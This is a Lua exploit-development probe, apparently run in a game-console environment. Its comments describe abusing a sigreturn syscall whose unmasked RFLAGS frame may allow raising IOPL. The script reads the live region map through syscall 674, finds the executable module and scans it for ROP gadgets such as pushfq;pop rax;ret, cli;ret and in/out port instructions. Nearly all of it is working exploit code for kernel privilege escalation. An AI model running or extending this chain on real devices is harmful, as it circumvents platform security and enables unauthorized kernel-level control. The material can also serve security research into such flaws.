-- CRASH_CLASS: LOW
-- PROBE 815b: find the eboot gadgets the frame experiment needs, using the
--            live region map instead of a hardcoded module extent
--
-- Context: sigreturn (417) installs a user-supplied frame verbatim (814b), and
-- the handler's EJUSTRETURN means the frame's own RAX becomes the value Lua
-- sees as the syscall return. The frame carries RFLAGS too, copied with no
-- masking, so IOPL can be raised if the iretq honours it. A one-gadget chain
-- with the caller's own RSP tests that:
--   RIP = pushfq; pop rax; ret   ->  the loader sees RFLAGS as the return value
-- Needed patterns: 9C 58 C3 (pushfq;pop rax;ret), 9C 5B C3, FA C3 (cli;ret),
-- ED C3 (in eax,dx;ret), EF C3 (out dx,eax;ret), 48 89 07 C3 (marker).
-- 815a crashed because it scanned a hardcoded 0x494000 from 0x1A880000,
-- which is only right when that module happens to be mapped exactly there.

print("=== PROBE 815b: EBOOT GADGET SCAN (REGION-AWARE) ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

local sc674 = make_syscall(674)
local REGBUF = memory.alloc(0x10000)
local COUNTP = memory.alloc(0x10)
for off = 0, 0xFFFF, 4 do safe_wd(REGBUF + off, 0) end
safe_wd(COUNTP, 0)

local rv = -1
local okc, rc = pcall(function()
    return sc674(uint64(REGBUF), uint64(72), uint64(0x300), uint64(COUNTP), uint64(0x40000000))
end)
if okc then rv = to_num(rc) end
local n = safe_rd(COUNTP) or 0
print(string.format("[R] 674 ret=%d regions=%d", rv, n))

-- eboot is the prot-5 region named "executable". Module bases move between
-- processes: 815c found it at 0x3CD64000 where 520a had seen 0x1A880000.
local lo_hit, hi_hit, prot_hit, name_hit = nil, nil, nil, nil
for i = 0, n - 1 do
    local rec = REGBUF + i * 72
    local lo = safe_rd(rec) or 0
    local hi = safe_rd(rec + 8) or 0
    local prot = safe_rd(rec + 0x18) or 0
    local s = ""
    for k = 0, 31 do
        local b = to_num(memory.read_byte(rec + 0x20 + k))
        if b == 0 then break end
        s = s .. string.char(b)
    end
    if prot == 5 and (s:find("executable", 1, true) ~= nil) and hi > lo then
        lo_hit, hi_hit, prot_hit, name_hit = lo, hi, prot, s
        break
    end
end

if not lo_hit then
    print("[R] no region named 'executable'; listing prot=5 regions")
    for i = 0, n - 1 do
        local rec = REGBUF + i * 72
        local lo = safe_rd(rec) or 0
        local hi = safe_rd(rec + 8) or 0
        local prot = safe_rd(rec + 0x18) or 0
        if prot == 5 and hi > lo then
            local s = ""
            for k = 0, 23 do
                local b = to_num(memory.read_byte(rec + 0x20 + k))
                if b == 0 then break end
                s = s .. string.char(b)
            end
            print(string.format("    [%08X,%08X) %s", lo, hi, s))
        end
    end
    print("=== PROBE 815b STOP (no executable region) ===")
    return
end

local EBOOT_BASE = lo_hit
local EBOOT_SIZE = hi_hit - lo_hit
print(string.format("[R] region %s = [%08X,%08X) prot=%d size=0x%X",
    tostring(name_hit), EBOOT_BASE, hi_hit, prot_hit, EBOOT_SIZE))

if EBOOT_SIZE > 0x800000 then
    print("[R] region too large to scan bytewise; clipping to 0x800000")
    EBOOT_SIZE = 0x800000
end

local rd_dw = memory.read_dword
local words = {}
local nw = 0
local holes = 0
for page = 0, EBOOT_SIZE - 1, 0x1000 do
    local okp = pcall(function()
        local tmp = {}
        for k = 0, 0x3FC, 4 do
            tmp[#tmp + 1] = rd_dw(EBOOT_BASE + page + k)
        end
        for k = 1, #tmp do
            nw = nw + 1
            words[nw] = to_num(tmp[k])
        end
    end)
    if not okp then
        -- keep the table aligned to page boundaries even for a bad page
        holes = holes + 1
        for k = 0, 0x3FC, 4 do
            nw = nw + 1
            words[nw] = 0
        end
    end
end
print(string.format("[S] read %d aligned dwords, %d unreadable pages", nw, holes))

local function find3(b0, b1, b2, limit)
    local pat = b0 + b1 * 0x100 + b2 * 0x10000
    local out = {}
    for i = 1, nw do
        local v = words[i]
        for k = 0, 3 do
            local shift = 1
            for _ = 1, k do shift = shift * 256 end
            if math.floor(v / shift) % 0x1000000 == pat then
                out[#out + 1] = EBOOT_BASE + (i - 1) * 4 + k
                if #out >= limit then return out end
            end
        end
    end
    return out
end

local function find2(b0, b1, limit)
    local pat = b0 + b1 * 0x100
    local out = {}
    for i = 1, nw do
        local v = words[i]
        for k = 0, 3 do
            local shift = 1
            for _ = 1, k do shift = shift * 256 end
            if math.floor(v / shift) % 0x10000 == pat then
                out[#out + 1] = EBOOT_BASE + (i - 1) * 4 + k
                if #out >= limit then return out end
            end
        end
    end
    return out
end

local function show(tag, hits)
    local txt = ""
    for i, a in ipairs(hits) do txt = txt .. string.format(" %X", a) end
    print(string.format("[G] %-20s hits=%d%s", tag, #hits, txt))
end

show("pushfq;pop rax;ret", find3(0x9C, 0x58, 0xC3, 6))
show("pushfq;pop rbx;ret", find3(0x9C, 0x5B, 0xC3, 4))
show("pushfq;pop rcx;ret", find3(0x9C, 0x59, 0xC3, 4))
show("mov [rdi],rax;ret",  find3(0x48, 0x89, 0x07, 6))
show("cli;ret",            find2(0xFA, 0xC3, 6))
show("sti;ret",            find2(0xFB, 0xC3, 4))
show("in eax,dx;ret",      find2(0xED, 0xC3, 4))
show("out dx,eax;ret",     find2(0xEF, 0xC3, 4))

print("")
print("=== PROBE 815b DONE ===")
